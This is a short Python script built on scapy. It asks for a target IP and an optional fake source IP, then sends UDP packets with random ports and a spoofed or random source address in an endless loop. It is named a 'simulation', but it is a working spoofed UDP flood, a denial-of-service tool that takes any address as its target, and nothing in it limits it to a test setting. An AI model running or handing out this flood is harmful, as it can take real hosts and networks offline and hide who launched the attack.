import scapy.all as scp

ip_src = input("Fake Source IP (blank for random IP): ")
ip_dst = input("Target IP: ")


def udpflood_simulation(ip_src, ip_dst):
    ip_layer = scp.IP(src=scp.RandIP(), dst=ip_dst)
    if ip_src:
        ip_layer.src = ip_src

    udp_layer = scp.UDP(sport=scp.RandShort(), dport=scp.RandShort())
    packet = ip_layer / udp_layer

    scp.send(packet, loop=1, verbose=False)
    print(packet)


udpflood_simulation(ip_src, ip_dst)
